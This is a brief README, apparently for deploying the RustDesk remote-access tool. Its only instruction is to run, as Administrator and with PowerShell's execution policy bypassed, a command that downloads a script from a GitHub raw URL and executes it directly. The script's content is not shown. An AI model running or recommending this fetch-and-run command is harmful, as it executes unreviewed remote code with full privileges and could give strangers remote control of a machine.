# RustDesk Deploy

Run this **single command** in PowerShell **as Administrator**:

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4aykas/rust/main/rust.ps1' -UseBasicParsing | Invoke-Expression"
```

> You will be prompted for the archive password. Contact your IT administrator to obtain it.
